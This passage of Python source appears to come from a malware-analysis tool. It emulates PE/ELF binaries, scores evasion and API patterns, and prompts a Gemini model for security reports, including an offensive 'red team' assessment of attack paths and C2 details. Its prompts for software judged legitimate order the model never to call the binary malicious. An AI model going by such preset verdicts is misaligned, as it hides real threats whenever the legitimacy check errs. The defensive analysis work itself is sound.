            "ai_verified": False,
        },
        "section_info": None,
        "packing_analysis": None,
        "evasion_analysis": None,
        "api_sequence_analysis": None,
        "emulation_result": None,
        "ai_verification": None,
        "final_verdict": None,
        "iocs": [],
        "recommendations": [],
        "errors": [],
    }
    
    # 1. Parse sections
    pe_info = parse_pe_sections(binary_data)
    elf_info = parse_elf_sections(binary_data)
    
    if pe_info["is_pe"]:
        result["section_info"] = {
            "format": "PE",
            "is_64bit": pe_info["is_64bit"],
            "image_base": hex(pe_info["image_base"]),
            "entry_point": hex(pe_info["image_base"] + pe_info["entry_point"]),
            "sections_count": len(pe_info["sections"])
        }
        base_address = pe_info["image_base"]
        if not entry_point:
            entry_point = pe_info["image_base"] + pe_info["entry_point"]
        architecture = "x64" if pe_info["is_64bit"] else "x86"
    elif elf_info["is_elf"]:
        result["section_info"] = {
            "format": "ELF",
            "is_64bit": elf_info["is_64bit"],
            "entry_point": hex(elf_info["entry_point"]),
            "architecture": elf_info["architecture"]
        }
        if not entry_point and elf_info["entry_point"]:
            entry_point = elf_info["entry_point"]
        architecture = elf_info["architecture"]
    
    result["architecture"] = architecture
    
    # 2. Run comprehensive emulation
    try:
        emu_result = await run_comprehensive_binary_emulation(
            binary_data=binary_data,
            architecture=architecture,
            ghidra_result=ghidra_result,
            base_address=base_address,
            entry_point=entry_point,
            enable_api_hooks=True,
            enable_crypto_detection=True,
            enable_branch_exploration=True,
            max_functions=10
        )
        result["emulation_result"] = emu_result
        result["summary"]["strings_recovered"] = len(emu_result.get("decrypted_strings", []))
        result["summary"]["apis_detected"] = len(emu_result.get("api_call_summary", []))
        
        if emu_result.get("packing_analysis", {}).get("is_packed"):
            result["summary"]["is_packed"] = True
            result["packing_analysis"] = emu_result.get("packing_analysis")
            
    except Exception as e:
        result["errors"].append(f"Emulation: {str(e)}")
    
    # 3. Detect evasion techniques
    try:
        evasion_result = detect_evasion_techniques(
            binary_data=binary_data,
            architecture=architecture,
            base_address=base_address
        )
        result["evasion_analysis"] = evasion_result
        result["summary"]["evasion_techniques"] = len(evasion_result.get("techniques_detected", []))
    except Exception as e:
        result["errors"].append(f"Evasion detection: {str(e)}")
    
    # 4. Analyze API sequences
    try:
        api_result = analyze_api_sequences(
            binary_data=binary_data,
            architecture=architecture,
            ghidra_result=ghidra_result,
            base_address=base_address
        )
        result["api_sequence_analysis"] = api_result
        result["summary"]["malicious_patterns"] = len(api_result.get("malicious_patterns", []))
    except Exception as e:
        result["errors"].append(f"API analysis: {str(e)}")
    
    # 5. AI Verification (if enabled and API key available)
    if verify_with_ai and settings.gemini_api_key and result.get("emulation_result"):
        try:
            ai_result = await verify_emulation_findings_with_ai(
                emulation_result=result["emulation_result"],
                static_result=static_result,
                ghidra_result=ghidra_result,
                binary_name=binary_name
            )
            result["ai_verification"] = ai_result
            result["summary"]["ai_verified"] = ai_result.get("success", False)
            
            # Extract IOCs
            if ai_result.get("high_confidence_iocs"):
                result["iocs"] = ai_result["high_confidence_iocs"]
            
            # Set final verdict based on AI
            if ai_result.get("behavioral_verdict"):
                result["final_verdict"] = {
                    "verdict": ai_result["behavioral_verdict"],
                    "confidence": ai_result.get("confidence_score", 0),
                    "classification": ai_result.get("malware_classification"),
                    "source": "ai_verified"
                }
                
        except Exception as e:
            result["errors"].append(f"AI verification: {str(e)}")
    
    # 6. Generate final verdict if AI didn't run
    if not result.get("final_verdict"):
        # Heuristic-based verdict
        score = 0
        
        # Evasion techniques
        evasion_score = result.get("evasion_analysis", {}).get("evasion_score", 0)
        score += evasion_score * 0.3
        
        # Malicious API patterns
        mal_patterns = result["summary"]["malicious_patterns"]
        score += min(mal_patterns * 15, 40)
        
        # Packing
        if result["summary"]["is_packed"]:
            score += 10
        
        # Behavioral indicators
        behaviors = result.get("emulation_result", {}).get("behavioral_indicators", [])
        if "anti_analysis_techniques" in behaviors:
            score += 10
        if "network_capability" in behaviors:
            score += 5
        if "command_execution" in behaviors:
            score += 10
        
        verdict = "benign"
        if score >= 70:
            verdict = "malicious"
        elif score >= 40:
            verdict = "suspicious"
        
        result["final_verdict"] = {
            "verdict": verdict,
            "confidence": min(int(score), 100),
            "source": "heuristic"
        }
    
    # Compile recommendations
    recommendations = []
    
    if result["summary"]["is_packed"]:
        recommendations.append("Binary is packed - review unpacked strings and code")
    
    if result["summary"]["evasion_techniques"] > 0:
        techniques = result.get("evasion_analysis", {}).get("techniques_detected", [])
        recommendations.append(f"Evasion detected: {', '.join(techniques[:3])}")
    
    if result["summary"]["malicious_patterns"] > 0:
        classifications = result.get("api_sequence_analysis", {}).get("behavior_classification", [])
        if classifications:
            recommendations.append(f"Malicious behavior: {', '.join(classifications[:3])}")
    
    if result.get("ai_verification", {}).get("recommendations"):
        recommendations.extend(result["ai_verification"]["recommendations"][:3])
    
    result["recommendations"] = recommendations
    result["success"] = True
    
    return result


# =============================================================================
# PART 10: BINARY AI REPORTS (Like APK's AI report suite)
# =============================================================================

async def generate_binary_ai_reports(
    binary_name: str,
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None,
    attack_surface: Optional[Dict[str, Any]] = None,
    obfuscation_result: Optional[Dict[str, Any]] = None,
    verified_findings: Optional[List[Dict]] = None,
    cve_findings: Optional[List[Dict]] = None,
    emulation_result: Optional[Dict[str, Any]] = None,
    dynamic_scripts: Optional[Dict[str, Any]] = None,
    is_legitimate_software: bool = False,
    legitimacy_indicators: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Generate comprehensive AI reports for binary analysis.
    
    Similar to APK's 4-report suite:
    1. Functionality Report - What does this binary do?
    2. Security Report - Security assessment
    3. Architecture Diagram - Mermaid diagram
    4. Attack Surface Map - Attack tree diagram
    
    Args:
        binary_name: Name of the binary
        static_result: Static analysis result
        ghidra_result: Ghidra decompilation
        attack_surface: Attack surface mapping
        obfuscation_result: Obfuscation analysis
        verified_findings: Verified vulnerabilities
        cve_findings: CVE lookup results
        emulation_result: Emulation analysis with AI verification
        dynamic_scripts: Generated Frida scripts
        is_legitimate_software: Whether binary appears to be from a known publisher
        legitimacy_indicators: List of reasons why it appears legitimate
        
    Returns:
        Dictionary with 4 AI reports
    """
    reports = {
        "functionality_report": None,
        "security_report": None,
        "architecture_diagram": None,
        "attack_surface_map": None,
        "generation_time": 0,
    }
    
    if not settings.gemini_api_key:
        logger.warning("No Gemini API key - skipping AI reports")
        return reports
    
    import time
    start_time = time.time()
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Build context for reports
        context_parts = []
        
        context_parts.append(f"Binary: {binary_name}")
        
        # Add legitimacy context FIRST - this is critical for correct assessment
        if is_legitimate_software:
            context_parts.append(f"""

                    LEGITIMATE SOFTWARE DETECTED                              

 This binary is from a KNOWN, TRUSTED publisher.                              
 Legitimacy Indicators: {', '.join(legitimacy_indicators[:3] or ['Known'])} 

  This is NOT malware - treat as commercial software                         
  APIs (CreateProcess, VirtualAlloc, InternetOpen) = NORMAL features         
  Only flag ACTUAL bugs (buffer overflow, UAF), not "suspicious patterns"    
  ASLR/DEP enabled = well-engineered, code signing = trusted                 

 DO NOT FLAG: network calls, registry access, process creation, crypto APIs   
""")
        
        if static_result:
            meta = static_result.metadata
            context_parts.append(f"""
=== BINARY METADATA ===
File Type: {meta.file_type}
Architecture: {meta.architecture}
File Size: {meta.file_size:,} bytes
Is Packed: {meta.is_packed}
Compile Time: {meta.compile_time or 'Unknown'}
Imports: {len(getattr(static_result, 'imports', []))}
Exports: {len(getattr(static_result, 'exports', []))}
Security Mitigations: {json.dumps(meta.mitigations)}""")
            
            # Include version info for better context
            if meta.version_info:
                vi = meta.version_info
                version_str = f"""
=== VERSION INFO (from PE resources) ===
Product: {vi.get('ProductName', 'Unknown')}
Company: {vi.get('CompanyName', 'Unknown')}
Version: {vi.get('FileVersion', 'Unknown')}
Description: {vi.get('FileDescription', 'Unknown')}
Copyright: {vi.get('LegalCopyright', 'Unknown')}"""
                context_parts.append(version_str)
            
            # Include authenticode status
            if meta.authenticode and meta.authenticode.get('signed'):
                context_parts.append(f"""
=== DIGITAL SIGNATURE ===
Status: SIGNED (Authenticode certificate present)
Certificate Type: {meta.authenticode.get('certificate_type', 'Unknown')}""")
        
        if ghidra_result:
            funcs = ghidra_result.get("functions", [])
            context_parts.append(f"\nDecompiled Functions: {len(funcs)}")
            # Include sample function names
            func_names = [f.get("name", "") for f in funcs[:20]]
            context_parts.append(f"Sample Functions: {', '.join(func_names)}")
        
        if obfuscation_result:
            context_parts.append(f"""
Obfuscation Level: {obfuscation_result.get('overall_obfuscation_level', 'unknown')}
Obfuscation Score: {obfuscation_result.get('obfuscation_score', 0)}/100
Detected Packers: {', '.join([p['name'] for p in obfuscation_result.get('detected_packers', [])])}""")
        
        if attack_surface:
            summary = attack_surface.get("summary", {})
            context_parts.append(f"""
Entry Points: {summary.get('total_entry_points', 0)}
Dangerous Functions: {summary.get('total_dangerous_functions', 0)}
Attack Vectors: {summary.get('total_attack_vectors', 0)}""")
        
        if verified_findings:
            context_parts.append(f"\nVerified Vulnerabilities: {len(verified_findings)}")
            for f in verified_findings[:5]:
                context_parts.append(f"  - {f.get('category')}: {f.get('title')} ({f.get('severity')})")
        
        if cve_findings:
            context_parts.append(f"\nKnown CVEs: {len(cve_findings)}")
            for cve in cve_findings[:5]:
                context_parts.append(f"  - {cve.get('cve_id')}: {cve.get('description', '')[:100]}")
        
        # Include emulation results if available
        if emulation_result:
            context_parts.append("\n=== DYNAMIC EMULATION ANALYSIS ===")
            
            # Final verdict from AI verification
            verdict_data = emulation_result.get("final_verdict", {})
            if verdict_data:
                context_parts.append(f"""
Emulation Verdict: {verdict_data.get('verdict', 'unknown').upper()}
Confidence: {verdict_data.get('confidence', 0)}%
Classification: {verdict_data.get('classification', 'unknown')}
Risk Assessment: {verdict_data.get('risk_assessment', 'unknown')}""")
            
            # IOCs discovered
            iocs = emulation_result.get("iocs", [])
            if iocs:
                context_parts.append(f"\nIndicators of Compromise (IOCs): {len(iocs)}")
                for ioc in iocs[:10]:
                    context_parts.append(f"  - [{ioc.get('type', 'unknown')}] {ioc.get('value', '')} (confidence: {ioc.get('confidence', 0)}%)")
            
            # Evasion techniques
            evasion = emulation_result.get("evasion_analysis", {})
            if evasion:
                techniques = evasion.get("techniques_detected", [])
                if techniques:
                    context_parts.append(f"\nEvasion Techniques Detected: {len(techniques)}")
                    for tech in techniques[:10]:
                        context_parts.append(f"  - {tech.get('technique', '')} at 0x{tech.get('address', 0):x}")
                context_parts.append(f"Evasion Score: {evasion.get('evasion_score', 0)}/100")
            
            # API sequence analysis for malicious behavior
            api_analysis = emulation_result.get("api_sequence_analysis", {})
            if api_analysis:
                patterns = api_analysis.get("detected_patterns", [])
                if patterns:
                    context_parts.append(f"\nMalicious API Patterns Detected: {len(patterns)}")
                    for pattern in patterns[:10]:
                        context_parts.append(f"  - {pattern.get('pattern', '')}: {pattern.get('description', '')}")
                classifications = api_analysis.get("behavior_classification", [])
                if classifications:
                    context_parts.append(f"Behavior Classifications: {', '.join(classifications)}")
            
            # Unpacking info
            if emulation_result.get("is_packed"):
                context_parts.append(f"\nPacked Binary: Original Entry Point candidates found at: {emulation_result.get('oep_candidates', [])}")
            
            # AI verification notes
            ai_verify = emulation_result.get("ai_verification", {})
            if ai_verify:
                context_parts.append(f"\nAI Behavioral Analysis: {ai_verify.get('behavioral_verdict', 'unknown')}")
                if ai_verify.get("recommendations"):
                    context_parts.append(f"AI Recommendations: {ai_verify.get('recommendations', [])[:3]}")
        
        # Include dynamic script analysis if available
        if dynamic_scripts:
            context_parts.append("\n=== DYNAMIC SCRIPT ANALYSIS ===")
            for script_name, script_result in dynamic_scripts.items():
                if isinstance(script_result, dict):
                    context_parts.append(f"\n{script_name}: {script_result.get('summary', 'No summary')}")
        
        context = "\n".join(context_parts)
        
        # Check if we have emulation data for enhanced prompts
        has_emulation = emulation_result and emulation_result.get("final_verdict")
        
        # 1. Functionality Report
        if is_legitimate_software:
            func_base = f"""Analyze this LEGITIMATE SOFTWARE binary and explain what it does:

{context}

REMEMBER: This is verified legitimate software (see legitimacy indicators above).
Do NOT describe it as malware, suspicious, or potentially malicious.

Provide a clear report covering:
1. **Purpose**: What is this binary designed to do? (Describe as legitimate software)
2. **Key Capabilities**: Main features and functions
3. **Dependencies**: Libraries and APIs it relies on
4. **Behavior Patterns**: How it operates (network, file, registry, etc.)
5. **Classification**: Identify the specific type of legitimate software (browser, utility, etc.)
6. **Publisher**: Who makes this software?"""
        else:
            func_base = f"""Analyze this binary and explain what it does:

{context}

Provide a clear report covering:
1. **Purpose**: What is this binary designed to do?
2. **Key Capabilities**: Main features and functions
3. **Dependencies**: Libraries and APIs it relies on
4. **Behavior Patterns**: How it operates (network, file, registry, etc.)
5. **Classification**: Type of software (utility, service, malware, etc.)"""
        
        if has_emulation:
            func_base += """
6. **Dynamic Behavior**: What did emulation reveal about runtime behavior?
7. **Evasion Attempts**: Any anti-analysis techniques detected?
8. **IOC Summary**: Key indicators of compromise discovered"""
        
        func_prompt = func_base + "\n\nFormat as markdown. Be concise but thorough."

        func_response = await asyncio.to_thread(
            lambda: sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=func_prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=60.0,
                operation_name="Binary functionality report"
            )
        )
        
        if func_response and func_response.text:
            reports["functionality_report"] = func_response.text
        
        # 2. Security Report
        if is_legitimate_software:
            # For LEGITIMATE SOFTWARE: Focus on security posture, not "vulnerabilities"
            sec_base = f"""You are a security analyst reviewing this LEGITIMATE, TRUSTED software.

{context}

CRITICAL CONTEXT:
- This is verified legitimate software from a known, trusted publisher
- It is NOT malware, NOT suspicious, and NOT a threat
- Standard APIs like CreateProcess, VirtualAlloc, network calls are NORMAL features
- Modern security mitigations (ASLR, DEP, CFG) indicate professional development

Provide a BALANCED SECURITY POSTURE ASSESSMENT:

##  EXECUTIVE SUMMARY
- **Software Type**: [e.g., Web Browser, IDE, System Utility]
- **Publisher**: [Verified publisher name]
- **Security Maturity**: [Excellent/Good/Average] - based on mitigations enabled
- **Overall Assessment**: This is legitimate, well-engineered software

##  SECURITY STRENGTHS
List the security features and good practices observed:
- Memory protections enabled (ASLR, DEP, CFG, etc.)
- Code signing / digital signatures
- Safe coding practices observed
- Sandboxing or isolation features

##  TECHNICAL OBSERVATIONS
Note any technical details relevant to security professionals:
- Architecture and compilation details
- Libraries and dependencies used
- Notable security-relevant features
- Areas that receive significant input validation

##  FOR SECURITY RESEARCHERS
If someone wanted to audit this software or participate in bug bounty:
- **Bug Bounty**: Check if the vendor has a bug bounty program
- **Known CVEs**: Search for any disclosed vulnerabilities
- **Audit Focus Areas**: Components that handle untrusted data
- **Tools to Use**: Recommended tools for deeper analysis

##  STANDARD CAVEATS
- All software has potential for undiscovered bugs
- Keep software updated to receive security patches
- Review privacy policy for data handling practices

NOTE: Do NOT describe this as malware, suspicious, or dangerous.
This is normal, legitimate software performing its intended functions."""
        else:
            sec_base = f"""You are a RED TEAM security researcher analyzing this binary from an ATTACKER'S PERSPECTIVE.

{context}

Provide a comprehensive OFFENSIVE SECURITY ASSESSMENT:

##  EXECUTIVE SUMMARY
- Overall threat/risk level (Critical/High/Medium/Low)
- Classification (malware type if malicious, or software category)
- Key findings in 2-3 sentences

##  VULNERABILITY & WEAKNESS ANALYSIS
For each security issue found:
- **Severity**: Critical/High/Medium/Low/Info
- **Exploitability**: How easily can this be exploited?
- **Attack Scenario**: Describe realistic attack path
- **Impact**: What damage could result?
- **Evidence**: Code/pattern that proves this

##  ATTACK SURFACE MAPPING
- **Entry Points**: All ways to interact with this binary
- **Trust Boundaries**: Where privilege changes occur
- **Data Flows**: How user input propagates
- **External Dependencies**: Libraries, services, network

##  IF MALICIOUS - Threat Analysis
- Malware family/type identification
- C2 infrastructure details
- Persistence mechanisms
- Payload capabilities
- Evasion techniques used

##  NEXT STEPS FOR REVERSE ENGINEERING
Provide a detailed action plan for deeper analysis:

### Immediate Actions (Do Now)
1. Specific functions to analyze with Ghidra/IDA
2. Strings to search for (C2, credentials, config)
3. API calls to hook/monitor
4. Network traffic to capture

### Recommended Tools & Techniques
| Tool | Purpose | Specific Usage |
|------|---------|----------------|
| x64dbg/WinDbg | Dynamic debugging | Set breakpoints at [addresses] |
| API Monitor | API tracing | Monitor [specific APIs] |
| Wireshark | Network capture | Filter for [protocols/IPs] |
| Process Monitor | System activity | Watch [paths/keys] |
| Volatility | Memory forensics | Dump [regions] |

### Deep Dive Areas
- Code sections requiring manual analysis
- Encrypted/encoded data to decrypt
- Custom protocols to reverse
- Anti-analysis to bypass

### Related Research
- CVEs affecting bundled libraries
- Similar malware samples to compare
- MITRE ATT&CK techniques observed
- YARA rules to write

##  PRIORITIZED INVESTIGATION PLAN
| Priority | Task | Effort | Expected Insight |
|----------|------|--------|------------------|
| P0 | ... | ... | ... |
| P1 | ... | ... | ... |"""
        
        if has_emulation:
            sec_base += """

##  DYNAMIC ANALYSIS FINDINGS
Based on emulation/sandboxing:

### Behavioral Verdict
- **Classification**: Malware/PUA/Benign/Unknown
- **Confidence**: High/Medium/Low
- **Family**: If known malware family

### Runtime Indicators
- API sequences observed (injection, persistence, evasion)
- Network connections attempted
- File system modifications
- Registry changes
- Process manipulations

### Evasion Analysis
- Anti-debugging techniques detected
- VM/Sandbox detection methods
- Timing attacks
- Environment checks

### IOC Extraction
| Type | Value | Confidence |
|------|-------|------------|
| IP | ... | ... |
| Domain | ... | ... |
| Hash | ... | ... |
| Mutex | ... | ... |"""
        
        sec_prompt = sec_base + """

Format as detailed markdown. Be specific with:
- Exact function names/addresses where possible
- Specific tool commands to run
- Concrete next steps, not vague suggestions"""

        sec_response = await asyncio.to_thread(
            lambda: sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=sec_prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=60.0,
                operation_name="Binary security report"
            )
        )
        
        if sec_response and sec_response.text:
            reports["security_report"] = sec_response.text
        
        # 3. Architecture Diagram - Focus on reverse engineering clarity
        arch_base = f"""Create a Mermaid architecture diagram for reverse engineering this binary:

{context}

Generate a flowchart that helps a reverse engineer understand the binary's structure:

Required elements:
- **Entry points** (main, DllMain, exports, callbacks)
- **Core modules/components** with their purposes
- **Data flow paths** showing how input travels through the code
- **External interfaces** (network, files, registry, IPC, APIs)
- **Security-relevant boundaries** (privilege transitions, trust zones)
- **Interesting functions** to investigate (crypto, network, file ops)"""
        
        if has_emulation:
            arch_base += """
- **Evasion modules** (anti-debug, anti-VM, timing checks)
- **C2 communication paths** with protocols
- **Unpacking stages** if multi-stage loader
- **Hooking/injection targets**
- **Persistence mechanisms**"""
        
        arch_prompt = arch_base + """

Use this structure:
```mermaid
flowchart TD
    subgraph Entry[" Entry Points"]
        EP1[main/WinMain]
        EP2[DllMain]
        EP3[Exports]
    end
    
    subgraph Core[" Core Logic"]
        ...
    end
    
    subgraph IO[" I/O Operations"]
        ...
    end
    
    subgraph Net[" Network"]
        ...
    end
    
    subgraph Security[" Security Functions"]
        ...
    end
    
    Entry --> Core
    ...
```

Icons to use:
-  Entry points
-  Core processing
-  File operations  
-  Network
-  Crypto/Security
-  Suspicious/Malicious
-  Anti-analysis
-  Persistence
-  Injection

Return ONLY the mermaid code block, no explanation."""

        arch_response = await asyncio.to_thread(
            lambda: sync_gemini_request_with_retry(
                lambda: client.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=arch_prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=60.0,
                operation_name="Binary architecture diagram"
            )
        )
        
        if arch_response and arch_response.text:
            mermaid_match = re.search(r'```mermaid\s*([\s\S]*?)\s*```', arch_response.text)
            if mermaid_match:
                diagram = mermaid_match.group(1).strip()
            elif arch_response.text.strip().startswith("flowchart"):
                diagram = arch_response.text.strip()
            else:
                diagram = None
            
            if diagram:
                # Sanitize for mermaid compatibility
                reports["architecture_diagram"] = _sanitize_mermaid_diagram(diagram)
        
        # 4. Attack Surface Map (using dedicated function)
        if attack_surface:
            reports["attack_surface_map"] = await generate_binary_attack_tree_mermaid(
                attack_surface, ghidra_result, verified_findings,
                is_legitimate_software=is_legitimate_software
            )
        
    except Exception as e:
        logger.error(f"Binary AI reports generation failed: {e}")
        reports["error"] = str(e)
    
    reports["generation_time"] = round(time.time() - start_time, 2)
    
    return reports
